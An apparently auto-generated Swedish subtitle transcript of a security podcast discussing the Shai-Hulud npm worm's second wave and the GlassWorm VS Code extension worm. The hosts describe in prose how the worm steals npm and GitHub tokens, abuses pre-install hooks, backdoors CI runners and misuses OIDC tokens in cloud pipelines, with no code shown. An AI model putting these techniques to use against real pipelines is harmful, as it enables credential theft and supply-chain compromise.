`206 00:06:46,960 --> 00:06:48,560`
men du får lov att modifiera någonting



`207 00:06:48,560 --> 00:06:50,740`
som inkluderas i pipelinen.



`208 00:06:53,640 --> 00:06:55,000`
Så det exekverades



`209 00:06:55,000 --> 00:06:56,340`
med deras rättigheter



`210 00:06:56,340 --> 00:06:59,140`
där



`211 00:06:59,140 --> 00:07:01,280`
grejer som gjordes inklud på



`212 00:07:01,280 --> 00:07:02,900`
i workflowet



`213 00:07:03,500 --> 00:07:05,580`
kunde angripa den, skriva över.



`214 00:07:06,720 --> 00:07:07,980`
Och då skriver man angripa den över igen.



`215 00:07:07,980 --> 00:07:08,740`
Poison pipeline, det är det du tänker på.



`216 00:07:09,400 --> 00:07:12,560`
Poison pipeline execution, andra typen.



`217 00:07:12,620 --> 00:07:14,340`
Precis, och trycka på



`218 00:07:14,340 --> 00:07:15,540`
poison pipeline, det är ju



`219 00:07:15,540 --> 00:07:18,500`
ett namn



`220 00:07:18,500 --> 00:07:19,780`
på många typer av olika attacker



`221 00:07:19,780 --> 00:07:21,580`
och det handlar ju om att man kan inte ändra



`222 00:07:21,580 --> 00:07:23,740`
men man kan oftast lägga till eller utöka



`223 00:07:23,740 --> 00:07:24,600`
eller inkludera.



`224 00:07:25,800 --> 00:07:28,020`
Och it all boils down till



`225 00:07:28,020 --> 00:07:29,460`
att vi har ingen



`226 00:07:29,460 --> 00:07:31,820`
datavalidering på hur det såg ut innan



`227 00:07:31,820 --> 00:07:33,480`
hur det ska se ut.



`228 00:07:33,500 --> 00:07:34,800`
Och hur det såg ut och vad som hände.



`229 00:07:35,720 --> 00:07:37,700`
Men om inte jag kommer ihåg fel så var det väl ett par



`230 00:07:37,700 --> 00:07:39,660`
ändringar som gjordes i



`231 00:07:39,660 --> 00:07:40,920`
the second coming.



`232 00:07:42,160 --> 00:07:43,640`
Det ena var att den kördes som pre-install



`233 00:07:43,640 --> 00:07:44,700`
istället för post-install.



`234 00:07:46,420 --> 00:07:47,560`
Det var också rätt coolt för den



`235 00:07:47,560 --> 00:07:48,580`
kördes med sin



`236 00:07:48,580 --> 00:07:51,900`
det är ju en javascript-grej



`237 00:07:51,900 --> 00:07:52,940`
det här, men



`238 00:07:52,940 --> 00:07:55,400`
den tar med sig sin egen



`239 00:07:55,400 --> 00:07:56,460`
javascript-motor också.



`240 00:07:57,100 --> 00:07:59,600`
Så när den kör sitt pre-install så



`241 00:07:59,600 --> 00:08:01,760`
laddar den ner bunn



`242 00:08:01,760 --> 00:08:03,240`
som tydligen är en javascript-motor.



`243 00:08:03,500 --> 00:08:06,100`
På den så kör den då sitt extremuppfuskerade



`244 00:08:06,100 --> 00:08:07,820`
attack-grej.



`245 00:08:08,680 --> 00:08:09,820`
Det här är väldigt intressant



`246 00:08:09,820 --> 00:08:11,500`
för det är väldigt trendigt det vi pratar om nu.



`247 00:08:12,560 --> 00:08:14,260`
Ur ett sätt att attackera saker.



`248 00:08:15,060 --> 00:08:15,300`
För



`249 00:08:15,300 --> 00:08:17,580`
om man tänker på en CSGD-pipeline



`250 00:08:17,580 --> 00:08:19,680`
så när den väl bygger någonting



`251 00:08:19,680 --> 00:08:22,060`
när den gör



`252 00:08:22,060 --> 00:08:22,940`
det du vill göra



`253 00:08:22,940 --> 00:08:26,000`
då har den gjort väldigt mycket grejer innan dess.



`254 00:08:27,460 --> 00:08:28,300`
Förstår du hur jag tänker?



`255 00:08:28,680 --> 00:08:28,860`
Så



`256 00:08:28,860 --> 00:08:31,920`
en grej som jag håller på mycket med nu



`257 00:08:31,920 --> 00:08:32,780`
det är just



`258 00:08:32,780 --> 00:08:36,200`
validering av byggen.



`259 00:08:36,920 --> 00:08:38,260`
Det är ett väldigt intressant



`260 00:08:38,260 --> 00:08:38,780`
attack-vektor.



`261 00:08:40,560 --> 00:08:41,780`
Vi säger att jag har



`262 00:08:41,780 --> 00:08:44,180`
skapat en PR som ska göra en massa ändringar



`263 00:08:44,180 --> 00:08:46,060`
och så säger jag, kan inte du kolla



`264 00:08:46,060 --> 00:08:47,160`
om det här makes sense?



`265 00:08:48,280 --> 00:08:49,020`
Och så kör man den.



`266 00:08:49,360 --> 00:08:51,800`
Och så gör den en test på



`267 00:08:51,800 --> 00:08:54,160`
vad som kommer hända när det här körs.



`268 00:08:55,800 --> 00:08:57,180`
Och så funderar man lite på



`269 00:08:57,180 --> 00:08:59,180`
vad behöver ske då?



`270 00:08:59,740 --> 00:09:00,840`
Jo, den behöver göra



`271 00:09:00,840 --> 00:09:02,760`
en fullständig,



`272 00:09:02,780 --> 00:09:04,780`
off, session,



`273 00:09:05,600 --> 00:09:07,800`
token, pre-environment,



`274 00:09:08,240 --> 00:09:10,280`
pre-poll, alla environment-variabler.



`275 00:09:10,400 --> 00:09:11,700`
Kolla att jag når de resurserna



`276 00:09:11,700 --> 00:09:14,080`
jag ska göra. Så att jag får en check på att



`277 00:09:14,080 --> 00:09:16,220`
ja, jag når den målmiljön



`278 00:09:16,220 --> 00:09:17,160`
det här ska in på.



`279 00:09:17,900 --> 00:09:19,020`
Så om mitt jobb gör bara



`280 00:09:19,020 --> 00:09:22,260`
gör det här och så skickar jag allting till event-loggen.



`281 00:09:23,280 --> 00:09:24,060`
Då kan jag ju få ut



`282 00:09:24,060 --> 00:09:25,840`
alla tokens och allting



`283 00:09:25,840 --> 00:09:27,920`
av en plan-pipeline



`284 00:09:27,920 --> 00:09:29,740`
som inte har några rättigheter



`285 00:09:29,740 --> 00:09:31,600`
överhuvudtaget men kommer sannolikt vara



`286 00:09:31,600 --> 00:09:32,760`
nycklad till någonting som är en fullständig event-logg.



`287 00:09:32,760 --> 00:09:34,880`
Som har svinhöga rättigheter



`288 00:09:34,880 --> 00:09:37,040`
i min cloud-infrastruktur eller någonting.



`289 00:09:37,660 --> 00:09:38,960`
Så då är ett lågprivilegierat



`290 00:09:38,960 --> 00:09:40,880`
event.någonting



`291 00:09:40,880 --> 00:09:42,920`
till någonting som



`292 00:09:42,920 --> 00:09:43,820`
går att läsa för alla.



`293 00:09:44,280 --> 00:09:45,860`
Kan då innehålla alla dina credentials.



`294 00:09:46,260 --> 00:09:48,200`
Så att göra någonting pre är asbra.



`295 00:09:48,320 --> 00:09:50,960`
Det loggas inte för att det är vanligt.



`296 00:09:51,820 --> 00:09:53,100`
Det exekveras



`297 00:09:53,100 --> 00:09:54,700`
hela tiden för att validera



`298 00:09:54,700 --> 00:09:56,200`
så att det blir för mycket data.



`299 00:09:56,760 --> 00:09:58,840`
Det är ett genialiskt sätt att attackera en pipeline på.



`300 00:09:59,680 --> 00:10:00,600`
För det har ju inte hänt något.



`301 00:10:00,600 --> 00:10:01,500`
Vi har ju bara testat.



`302 00:10:02,760 --> 00:10:04,660`
Om någonting skett sig



`303 00:10:04,660 --> 00:10:06,340`
i själva install



`304 00:10:06,340 --> 00:10:08,260`
så har de ändå kört sitt skript.



`305 00:10:08,560 --> 00:10:10,080`
Då har payloaden redan gått.



`306 00:10:10,940 --> 00:10:12,500`
En spännande fråga.



`307 00:10:12,880 --> 00:10:13,660`
Det finns ju



`308 00:10:13,660 --> 00:10:14,880`
en



`309 00:10:14,880 --> 00:10:17,120`
Simon



`310 00:10:17,120 --> 00:10:19,320`
Silium.



`311 00:10:19,960 --> 00:10:22,460`
Det finns ju en scanner



`312 00:10:22,460 --> 00:10:24,720`
som kan scanna dina workplaces



`313 00:10:24,720 --> 00:10:26,240`
och berätta om säkerhetsmålen i den.



`314 00:10:27,000 --> 00:10:28,780`
Det är med Z väl?



`315 00:10:28,900 --> 00:10:30,100`
Någonting med Z.



`316 00:10:30,100 --> 00:10:30,320`
Ja.



`317 00:10:30,880 --> 00:10:32,400`
Det är ändå intressant.



`318 00:10:32,760 --> 00:10:36,380`
Man undrar ju om den scannen



`319 00:10:36,380 --> 00:10:37,400`
hade tagit de här grejerna.



`320 00:10:37,600 --> 00:10:39,940`
Men i övrigt så känns det ju som att just nu så...



`321 00:10:39,940 --> 00:10:42,000`
Ja, det hade den ju.



`322 00:10:42,180 --> 00:10:43,580`
Men inte...



`323 00:10:43,580 --> 00:10:45,320`
Ja, det hade den, skulle jag säga.



`324 00:10:45,820 --> 00:10:48,320`
Men det här är ju



`325 00:10:48,320 --> 00:10:50,200`
inte samma sak.



`326 00:10:50,520 --> 00:10:51,580`
För det här är ju idéer.



`327 00:10:52,100 --> 00:10:54,280`
Det här är ett annat...



`328 00:10:54,280 --> 00:10:56,480`
Men det är ju samma systemiska idé



`329 00:10:56,480 --> 00:10:56,920`
av det.



`330 00:10:58,040 --> 00:10:58,960`
Vad skulle den agera på?



`331 00:10:58,960 --> 00:11:00,400`
Det här är en NPM-install.



`332 00:11:00,600 --> 00:11:01,160`
Nej, exakt.



`333 00:11:02,760 --> 00:11:04,740`
En post-tog där.



`334 00:11:05,660 --> 00:11:07,280`
De har ju ett workflow



`335 00:11:07,280 --> 00:11:09,420`
som i sin grej



`336 00:11:09,420 --> 00:11:12,380`
så inkluderar



`337 00:11:12,380 --> 00:11:12,680`
de



`338 00:11:12,680 --> 00:11:16,080`
ett JavaScript som fienden



`339 00:11:16,080 --> 00:11:16,760`
kontrollerar.



`340 00:11:17,640 --> 00:11:19,560`
Nu ska vi se vad fan det heter.



`341 00:11:19,820 --> 00:11:20,220`
I alla fall.



`342 00:11:21,320 --> 00:11:23,540`
Och sen så är det ju dessutom så att den här NPM-installen



`343 00:11:23,540 --> 00:11:25,260`
den behöver vi inte ens köra i en CSID.



`344 00:11:25,340 --> 00:11:27,000`
Den kan ju köra på lokal laptop.



`345 00:11:27,000 --> 00:11:28,300`
Det är förmodligen det vanligaste



`346 00:11:28,300 --> 00:11:29,800`
sättet som i alla fall



`347 00:11:29,800 --> 00:11:32,520`
Wormen har funkat. Den går vidare från



`348 00:11:32,760 --> 00:11:34,880`
GT-paket. Det är ju inte en byggpipa utan det är förmodligen



`349 00:11:34,880 --> 00:11:36,080`
lokalt på utvecklarnas laptop.



`350 00:11:36,920 --> 00:11:38,300`
Där kör man en NPM-install,



`351 00:11:38,960 --> 00:11:40,960`
skrapar upp mina NPM-tokens,



`352 00:11:41,520 --> 00:11:42,620`
sabbar mitt lokala repo



`353 00:11:42,620 --> 00:11:44,680`
och skjuter upp då min nya



`354 00:11:44,680 --> 00:11:46,540`
biblioteket till NPM.



`355 00:11:49,540 --> 00:11:50,900`
Men, den gjorde



`356 00:11:50,900 --> 00:11:52,640`
ännu mer i den nya versionen.



`357 00:11:52,940 --> 00:11:54,520`
För ett problem den hade lite



`358 00:11:54,520 --> 00:11:56,580`
så som den spred



`359 00:11:56,580 --> 00:11:58,180`
hemligheterna



`360 00:11:58,180 --> 00:12:01,000`
var ju att den skapade ett nytt publikt



`361 00:12:01,000 --> 00:12:02,220`
GitHub-repo.



`362 00:12:02,760 --> 00:12:04,760`
Med de GitHub-token den hittade lokalt.



`363 00:12:04,760 --> 00:12:06,760`
Och om det då inte finns några lokala



`364 00:12:06,760 --> 00:12:08,760`
GitHub-token



`365 00:12:08,760 --> 00:12:10,760`
eller de inte kan användas



`366 00:12:10,760 --> 00:12:12,760`
för att bygga ett repo, då stannar ju



`367 00:12:12,760 --> 00:12:14,760`
spridningen av



`368 00:12:14,760 --> 00:12:16,760`
hemligheter där. Det var lite dumt.



`369 00:12:16,760 --> 00:12:18,760`
Så att då var de lite smartare



`370 00:12:18,760 --> 00:12:20,760`
och att om de hittar hemligheter



`371 00:12:20,760 --> 00:12:22,760`
så skickas ju de upp till ett publikt konto.



`372 00:12:22,760 --> 00:12:24,760`
Som heter något speciellt.



`373 00:12:24,760 --> 00:12:26,760`
Shai hallowed the second coming typ.



`374 00:12:26,760 --> 00:12:28,760`
Så om den här Wormen inte hittade



`375 00:12:28,760 --> 00:12:30,760`
användbara lokala GitHub-tokens



`376 00:12:30,760 --> 00:12:32,680`
så kopplar de upp sig på



`377 00:12:32,680 --> 00:12:34,680`
och sökte



`378 00:12:34,680 --> 00:12:36,680`
bland alla publika GitHub-repon



`379 00:12:36,680 --> 00:12:38,680`
som hette det här.



`380 00:12:38,680 --> 00:12:40,680`
Och så laddade de ner någon annans



`381 00:12:40,680 --> 00:12:42,680`
GitHub-token.



`382 00:12:42,680 --> 00:12:44,680`
Och då visste de inte exakt



`383 00:12:44,680 --> 00:12:46,680`
vilka repo någon skulle lyckas med.



`384 00:12:46,680 --> 00:12:48,680`
Så de bara laddade ner ett sådant repo



`385 00:12:48,680 --> 00:12:50,680`
triple base64 decodade



`386 00:12:50,680 --> 00:12:52,680`
en viss parameter



`387 00:12:52,680 --> 00:12:54,680`
för det var så de krypterade informationen.



`388 00:12:54,680 --> 00:12:56,680`
Testade om den hade rätt rättigheter



`389 00:12:56,680 --> 00:12:58,680`
för att bygga ett nytt repo. Hade den inte det



`390 00:12:58,680 --> 00:13:00,680`
då tar vi nästa.



`391 00:13:00,680 --> 00:13:02,520`
Då tar vi nästa. Till de hittar någon som har tillräckligt



`392 00:13:02,520 --> 00:13:04,520`
kraftfullt GitHub-token för att de ska kunna



`393 00:13:04,520 --> 00:13:06,520`
skapa ett nytt repo och skjuta upp hemligheterna



`394 00:13:06,520 --> 00:13:08,520`
för den här stackaren också.



`395 00:13:08,520 --> 00:13:10,520`
Sismor heter det.



`396 00:13:10,520 --> 00:13:12,520`
Sismor. Z.



`397 00:13:12,520 --> 00:13:14,520`
Ja men då hade jag



`398 00:13:14,520 --> 00:13:16,520`
typ en bokstav off



`399 00:13:16,520 --> 00:13:18,520`
när jag sa det första.



`400 00:13:18,520 --> 00:13:20,520`
Ja det är skitcoolt.



`401 00:13:20,520 --> 00:13:22,520`
Unacceptable.



`402 00:13:22,520 --> 00:13:24,520`
Sen var det väl även så att de



`403 00:13:24,520 --> 00:13:26,520`
gjorde någonting med



`404 00:13:26,520 --> 00:13:28,520`
de hade GitHub work



`405 00:13:28,520 --> 00:13:30,520`
action inne.



`406 00:13:30,520 --> 00:13:32,520`
Det känns att de var med på något sätt också och byggde någon slags



`407 00:13:32,520 --> 00:13:34,520`
via



`408 00:13:34,520 --> 00:13:36,520`
issue comments så kunde man skicka



`409 00:13:36,520 --> 00:13:38,520`
kommandon till



`410 00:13:38,520 --> 00:13:40,520`
Wormen också på något sätt.



`411 00:13:40,520 --> 00:13:42,520`
Som en CNC typ. Perfekt.



`412 00:13:42,520 --> 00:13:44,520`
Och om



`413 00:13:44,520 --> 00:13:46,520`
ingenting funkade



`414 00:13:46,520 --> 00:13:48,520`
det fanns inga bra GitHub-token



`415 00:13:48,520 --> 00:13:50,520`
det fanns inga mpmp-token



`416 00:13:50,520 --> 00:13:52,520`
så när man blev besviken helt enkelt



`417 00:13:52,520 --> 00:13:54,520`
då delitade de alla filerna lokalt.



`418 00:13:54,520 --> 00:13:56,520`
Alla använde CIA lokalt.



`419 00:13:56,520 --> 00:13:58,520`
Så det var en liten destroyer med det här.



`420 00:13:58,520 --> 00:14:00,520`
Men de infekterna



`421 00:14:00,520 --> 00:14:02,520`
infektade väl också, de infektade ju runners



`422 00:14:02,520 --> 00:14:04,520`
lokala och



`423 00:14:04,520 --> 00:14:06,520`
Just det, just det. Det var jävligt snyggt.



`424 00:14:06,520 --> 00:14:08,520`
Local runners.



`425 00:14:08,520 --> 00:14:10,520`
Om ni gör inte det



`426 00:14:10,520 --> 00:14:12,520`
och gör inte organizational



`427 00:14:12,520 --> 00:14:14,520`
local runners, det är ett jävla nightmare.



`428 00:14:14,520 --> 00:14:16,520`
Men de runnersna hade ju då



`429 00:14:16,520 --> 00:14:18,520`
såklart jättehöga behörigheter för



`430 00:14:18,520 --> 00:14:20,520`
det är ju insidan ändå.



`431 00:14:20,520 --> 00:14:22,520`
Så de spånade ju backdoors.



`432 00:14:22,520 --> 00:14:24,520`
Runnersarna.



`433 00:14:24,520 --> 00:14:26,520`
För att de får göra vad de vill oftast.



`434 00:14:26,520 --> 00:14:28,520`
Ring och skapa en backdoor.



`435 00:14:28,520 --> 00:14:30,520`
Då gjorde de ju precis det Mattias säger.



`436 00:14:30,520 --> 00:14:32,520`
Kolla i localen, vi körde trufflehog



`437 00:14:32,520 --> 00:14:34,520`
bla bla bla.



`438 00:14:34,520 --> 00:14:36,520`
Och samla på sig allting och



`439 00:14:36,520 --> 00:14:38,520`
skicka det vidare.



`440 00:14:38,520 --> 00:14:40,520`
Eller då propagation-idén som vi har pratat om



`441 00:14:40,520 --> 00:14:42,520`
med mpmpublish.



`442 00:14:42,520 --> 00:14:44,520`
Alltså man skickade det vidare.



`443 00:14:44,520 --> 00:14:46,520`
Men sen också då inject malicious workflows.



`444 00:14:46,520 --> 00:14:48,520`
Så att de skapade ju då egna



`445 00:14:48,520 --> 00:14:50,520`
workflow triggers och event triggers



`446 00:14:50,520 --> 00:14:52,520`
för att få ut då secret extraction



`447 00:14:52,520 --> 00:14:54,520`
och remote controlled backdoors.



`448 00:14:54,520 --> 00:14:56,520`
Och det är det här lite det jag pratade om innan.



`449 00:14:56,520 --> 00:14:58,520`
Vi kan prata om det mer nu då.



`450 00:14:58,520 --> 00:15:00,520`
Om jag drar igång en workflow.



`451 00:15:00,520 --> 00:15:02,520`
Säg att den är kopplad till



`452 00:15:02,520 --> 00:15:04,520`
till Google



`453 00:15:04,520 --> 00:15:06,520`
i det här fallet.



`454 00:15:06,520 --> 00:15:08,520`
Vad är det jag vill ha då?



`455 00:15:08,520 --> 00:15:10,520`
Jo, jag vill ju ha en identitet i Google



`456 00:15:10,520 --> 00:15:12,520`
så jag kan börja harva runt.



`457 00:15:12,520 --> 00:15:14,520`
För vi vill ju sno AVS-nycklar och vi vill sno grejer ju.



`458 00:15:14,520 --> 00:15:16,520`
Eller GCP.



`459 00:15:16,520 --> 00:15:18,520`
Men får du, bara för du skapar en workflow



`460 00:15:18,520 --> 00:15:20,520`
så får du väl inte de rättigheterna?



`461 00:15:20,520 --> 00:15:22,520`
Exakt. Men om jag skapar en workflow



`462 00:15:22,520 --> 00:15:24,520`
och jag kan trigga den.



`463 00:15:24,520 --> 00:15:26,520`
Och den använder workload identity.



`464 00:15:26,520 --> 00:15:28,520`
Då kommer den att köra



`465 00:15:28,520 --> 00:15:30,520`
workflowen som heter



`466 00:15:30,520 --> 00:15:32,520`
deploy textfil till



`467 00:15:32,520 --> 00:15:34,520`
bucket 1.



`468 00:15:34,520 --> 00:15:36,520`
Då kommer den att göra det.



`469 00:15:36,520 --> 00:15:38,520`
Och då kommer den ju behöva handskaka fram en workload identity token.



`470 00:15:38,520 --> 00:15:40,520`
Som gäller i 15 minuter.



`471 00:15:40,520 --> 00:15:42,520`
Och det ingår liksom i



`472 00:15:42,520 --> 00:15:44,520`
actionen på något sätt?



`473 00:15:44,520 --> 00:15:46,520`
Exakt, för du har satt upp en



`474 00:15:46,520 --> 00:15:48,520`
sammelfördelning, eller du har satt upp en



`475 00:15:48,520 --> 00:15:50,520`
ID connect mellan repot och Google i det här fallet.



`476 00:15:50,520 --> 00:15:52,520`
Och det sätter upp före då?



`477 00:15:52,520 --> 00:15:54,520`
Du behöver inte göra det specifikt för workflowen?



`478 00:15:54,520 --> 00:15:56,520`
Okej. Kanon\!



`479 00:15:56,520 --> 00:15:58,520`
Så då får de den där open ID connect



`480 00:15:58,520 --> 00:16:00,520`
tokenen och så kan de harva runt i 15 minuter.



`481 00:16:00,520 --> 00:16:02,520`
Har man riktigt tur så är den organisational



`482 00:16:02,520 --> 00:16:04,520`
wide eller project wide. Så då kan du skapa



`483 00:16:04,520 --> 00:16:06,520`
massa grejer i det



`484 00:16:06,520 --> 00:16:08,520`
fönstret om 15 minuter. Och då är det såhär



`485 00:16:08,520 --> 00:16:10,520`
efter de första 15 minuterna så har du ju skapat ett servicekonto.



`486 00:16:10,520 --> 00:16:12,520`
Då är du hemma.



`487 00:16:12,520 --> 00:16:14,520`
Så det här är kul och det här är också



`488 00:16:14,520 --> 00:16:16,520`
en modern attacksökning. Lite typ exakt sånt här.



`489 00:16:16,520 --> 00:16:18,520`
Jag tittar på asmycket nu.



`490 00:16:18,520 --> 00:16:20,520`
Det är inte jag som har skrivit det här, vill jag bara säga.



`491 00:16:20,520 --> 00:16:22,520`
Men det använder alla coola bells and whistles.



`492 00:16:22,520 --> 00:16:24,520`
Och just saker som är



`493 00:16:24,520 --> 00:16:26,520`
som du säger där.



`494 00:16:26,520 --> 00:16:28,520`
Sker detta liksom automatiskt bara?



`495 00:16:28,520 --> 00:16:30,520`
Ja det gör det för att det sitter högre upp i



`496 00:16:30,520 --> 00:16:32,520`
organisationsstrukturen. När vi sätter upp



`497 00:16:32,520 --> 00:16:34,520`
våra claims, våra assertions.



`498 00:16:34,520 --> 00:16:36,520`
Hur vi kopplar ur events får lov att triggas.



`499 00:16:36,520 --> 00:16:38,520`
Det är helt kokobello



`500 00:16:38,520 --> 00:16:40,520`
för att prata svenska.



`501 00:16:40,520 --> 00:16:42,520`
För det finns ingen logik



`502 00:16:42,520 --> 00:16:44,520`
överhuvudtaget. Så det är typ



`503 00:16:44,520 --> 00:16:46,520`
hur känns det idag?



`504 00:16:46,520 --> 00:16:48,520`
Ja men såhär. Ja det gick åt helvete.



`505 00:16:48,520 --> 00:16:50,520`
Ingen kan ha en bra dag och



`506 00:16:50,520 --> 00:16:52,520`
vibecodar man blir det ännu bättre.



`507 00:16:52,520 --> 00:16:54,520`
Såklart. Det kan bli vad som helst.



`508 00:16:54,520 --> 00:16:56,520`
Det här är en kul grej.



`509 00:16:56,520 --> 00:16:58,520`
Som jag nämnde



`510 00:16:58,520 --> 00:17:00,520`
förra gången



`511 00:17:00,520 --> 00:17:02,520`
vi snackade om Shahoolood



`512 00:17:02,520 --> 00:17:04,520`
så hade jag ju varit på en



`513 00:17:04,520 --> 00:17:06,520`
rust meetup och de snackade ju lite om att



`514 00:17:06,520 --> 00:17:08,520`
det här är ju ett väldigt socialt problem



`515 00:17:08,520 --> 00:17:10,520`
att vi vill ha ut grejer så snabbt



`516 00:17:10,520 --> 00:17:12,520`
och så.



`517 00:17:12,520 --> 00:17:14,520`
Och



`518 00:17:14,520 --> 00:17:16,520`
det är inte uppenbart för mig



`519 00:17:16,520 --> 00:17:18,520`
just nu varför



`520 00:17:18,520 --> 00:17:20,520`
det här



`521 00:17:20,520 --> 00:17:22,520`
vi har sett det här så mycket just



`522 00:17:22,520 --> 00:17:24,520`
runt NPM-paket.



`523 00:17:24,520 --> 00:17:26,520`
För



`524 00:17:26,520 --> 00:17:28,520`
det skulle ju kunna



`525 00:17:28,520 --> 00:17:30,520`
vara liksom Python också.



`526 00:17:30,520 --> 00:17:32,520`
Ja det känns ju som



`527 00:17:32,520 --> 00:17:34,520`
åtminstone för oss så hade det ju varit mycket otrevligare



`528 00:17:34,520 --> 00:17:36,520`
om de hade gett sig på pip.



`529 00:17:36,520 --> 00:17:38,520`
Det är bara för vi är så gamla



`530 00:17:38,520 --> 00:17:40,520`
det är ingen som skriver grejer i Python längre.



`531 00:17:40,520 --> 00:17:42,520`
De ska hålla på med



`532 00:17:42,520 --> 00:17:44,520`
Javascript.



`533 00:17:44,520 --> 00:17:46,520`
Nej men alltså



`534 00:17:46,520 --> 00:17:48,520`
typ du kan ju göra



`535 00:17:48,520 --> 00:17:50,520`
motsvarande attackfläden



`536 00:17:50,520 --> 00:17:52,520`
via rust eller vad som händer



`537 00:17:52,520 --> 00:17:54,520`
liksom. Det är ju liksom



`538 00:17:54,520 --> 00:17:56,520`
det finns ju ingenting som egentligen



`539 00:17:56,520 --> 00:17:58,520`
är NPM-specifikt. Men tror du inte bara att det är så att



`540 00:17:58,520 --> 00:18:00,520`
jag kan inte det? Alltså vem



`541 00:18:00,520 --> 00:18:02,520`
fan håller på med Rust om man inte har någon



`542 00:18:02,520 --> 00:18:04,520`
form av självskadebeteende?



`543 00:18:04,520 --> 00:18:06,520`
Ja, det kan ju antingen vara så att de som



`544 00:18:06,520 --> 00:18:08,520`
gör detta



`545 00:18:08,520 --> 00:18:10,520`
stämmer sig för att använda sig av NPM för att de kan



`546 00:18:10,520 --> 00:18:12,520`
den världen bäst. Ja.



`547 00:18:12,520 --> 00:18:14,520`
Eller grejer där det står liksom. Eller



`548 00:18:14,520 --> 00:18:16,520`
så hade de identifierat att om de helst vill komma



`549 00:18:16,520 --> 00:18:18,520`
åt, jobba mest med paket som



`550 00:18:18,520 --> 00:18:20,520`
tas därifrån, är det nog. Mm.



`551 00:18:20,520 --> 00:18:22,520`
Och fortfarande har vi inte



`552 00:18:22,520 --> 00:18:24,520`
De är bara intresserade av Spice



`553 00:18:24,520 --> 00:18:26,520`
i NPM. Vi har fortfarande inte sett



`554 00:18:26,520 --> 00:18:28,520`
någon, alltså



`555 00:18:28,520 --> 00:18:30,520`
kapitalisering på



`556 00:18:30,520 --> 00:18:32,520`
vad vi vet. Det kanske är hur mycket



`557 00:18:32,520 --> 00:18:34,520`
ransom som helst nu. Nej det är supersvårt att veta.



`558 00:18:34,520 --> 00:18:36,520`
Det vi vet är att jävligt många hemligheter finns på GitHub.



`559 00:18:36,520 --> 00:18:38,520`
Ja. Mm. Det vet vi.



`560 00:18:38,520 --> 00:18:40,520`
Det fanns innan också fast i fel



`561 00:18:40,520 --> 00:18:42,520`
personens händer. Ja.



`562 00:18:42,520 --> 00:18:44,520`
Japp. Ja det var nog så också innan.



`563 00:18:44,520 --> 00:18:46,520`
Men nu finns det nog väldigt många fler hemligheter. Ja exakt.



`564 00:18:46,520 --> 00:18:48,520`
25 000



`565 00:18:48,520 --> 00:18:50,520`
Du var ute och leta.



`566 00:18:50,520 --> 00:18:52,520`
Ja. Och så är det ju verkligen.



`567 00:18:52,520 --> 00:18:54,520`
Och då är det bra om man har en bra process för att



`568 00:18:54,520 --> 00:18:56,520`
rulla saker. Och då



`569 00:18:56,520 --> 00:18:58,520`
är OpenID Connect ganska bra.



`570 00:18:58,520 --> 00:19:00,520`
En sak som varit ganska intressant här



`571 00:19:00,520 --> 00:19:02,520`
tycker jag det är att NPM då,



`572 00:19:02,520 --> 00:19:04,520`
alltså npm.org är det väl



`573 00:19:04,520 --> 00:19:06,520`
som ägs. Inte .se.



`574 00:19:06,520 --> 00:19:08,520`
Som ägs av GitHub dessutom, har varit



`575 00:19:08,520 --> 00:19:10,520`
väldigt tysta.



`576 00:19:10,520 --> 00:19:12,520`
Man kan ju tycka att, okej det är ju inte helt och hållet



`577 00:19:12,520 --> 00:19:14,520`
deras fel, men jag menar nu har det hänt



`578 00:19:14,520 --> 00:19:16,520`
två gånger. Exakt. Kanske dags att



`579 00:19:16,520 --> 00:19:18,520`
säga någonting. Och de hade, jag vet att



`580 00:19:18,520 --> 00:19:20,520`
efter första gången så kom de ut, de har



`581 00:19:20,520 --> 00:19:22,520`
en plan på vad det är de ska förbättra. Och den kommer



`582 00:19:22,520 --> 00:19:24,520`
exekveras nu i början av december tror jag.



`583 00:19:24,520 --> 00:19:26,520`
Men de har liksom inte sagt ett ord efter



`584 00:19:26,520 --> 00:19:28,520`
second wave. Och second wave är ju



`585 00:19:28,520 --> 00:19:30,520`
allvarligare än första.



`586 00:19:30,520 --> 00:19:32,520`
Det var ju en vecka sedan.



`587 00:19:32,520 --> 00:19:34,520`
Lugna ner dig. Det finns inte



`588 00:19:34,520 --> 00:19:36,520`
ingen, ingen advice eller någonting



`589 00:19:36,520 --> 00:19:38,520`
till kunderna eller användarna finns. Och det



`590 00:19:38,520 --> 00:19:40,520`
tycker jag är lite tunt för jag finner att det är rätt mycket



`591 00:19:40,520 --> 00:19:42,520`
bloggposter där ute. Ja. Och då kan man ju



`592 00:19:42,520 --> 00:19:44,520`
tycka att de någonting. Du vet det har varit såhär



`593 00:19:44,520 --> 00:19:46,520`
Thanksgiving och



`594 00:19:46,520 --> 00:19:48,520`
Black Week och så. Och de har haft det lite körigt



`595 00:19:48,520 --> 00:19:50,520`
jag fattar det, men kommunicera för



`596 00:19:50,520 --> 00:19:52,520`
helvete. Ja. Absolut.



`597 00:19:52,520 --> 00:19:54,520`
Jag håller med. Nu vill jag ändå prata



`598 00:19:54,520 --> 00:19:56,520`
ormar. Ja\! Mm. Och då vill jag prata



`599 00:19:56,520 --> 00:19:58,520`
om en annan orm. Den heter



`600 00:19:58,520 --> 00:20:00,520`
Glass Worm. Och den



`601 00:20:00,520 --> 00:20:02,520`
dök faktiskt upp så sent som



`602 00:20:02,520 --> 00:20:04,520`
eller



`603 00:20:04,520 --> 00:20:06,520`
så tidigt som



`604 00:20:06,520 --> 00:20:08,520`
det var en månad efter



`605 00:20:08,520 --> 00:20:10,520`
första Shai-Halud. När kan detta ha varit?



`606 00:20:10,520 --> 00:20:12,520`
18 oktober.



`607 00:20:12,520 --> 00:20:14,520`
Det är återigen



`608 00:20:14,520 --> 00:20:16,520`
Worm, self-propagating.



`609 00:20:16,520 --> 00:20:18,520`
Och. Inne nu.



`610 00:20:18,520 --> 00:20:20,520`
Det är väldigt inne nu. Och den



`611 00:20:20,520 --> 00:20:22,520`
agerar inte i NPM



`612 00:20:22,520 --> 00:20:24,520`
utan istället i VS Code



`613 00:20:24,520 --> 00:20:26,520`
extensions. Alltså om man använder



`614 00:20:26,520 --> 00:20:28,520`
IDE. Just det, det läste jag någonting om. Om man använder IDE



`615 00:20:28,520 --> 00:20:30,520`
VS Code då, Visual Studio Code. Det gör jag.



`616 00:20:30,520 --> 00:20:32,520`
Det finns en massor med extensions.



`617 00:20:32,520 --> 00:20:34,520`
Och



`618 00:20:34,520 --> 00:20:36,520`
då har de använt en liten strategi



`619 00:20:36,520 --> 00:20:38,520`
här som är att vi



`620 00:20:38,520 --> 00:20:40,520`
skaffar extensions



`621 00:20:40,520 --> 00:20:42,520`
som heter typ precis samma som de



`622 00:20:42,520 --> 00:20:44,520`
